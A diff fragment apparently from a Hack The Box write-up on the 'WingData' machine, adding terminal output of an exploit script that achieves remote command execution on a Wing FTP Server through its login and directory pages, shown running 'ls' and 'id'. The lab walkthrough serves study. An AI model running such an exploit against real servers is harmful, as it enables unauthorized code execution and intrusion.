@@ -64,5 +64,42 @@ _laurel:x:999:996::/var/log/laurel:/bin/false
 ```
 
 ```
+ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "ls"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls' and username: 'anonymous'
+[+] UID extracted: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 5d3e8695ce36382cb47239e130d1acd6f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+Data
+License.txt
+Log
+lua
+pid-wftpserver.pid
+README
+session
+session_admin
+version.txt
+webadmin
+webclient
+wftpconsole
+wftp_default_ssh.key
+wftp_default_ssl.crt
+wftp_default_ssl.key
+wftpserver
+----------------------
+```
 
 ```
+ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "id"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
+[+] UID extracted: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 3a2e58c9ff28c01e591d7be4bc4af598f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
+```
+
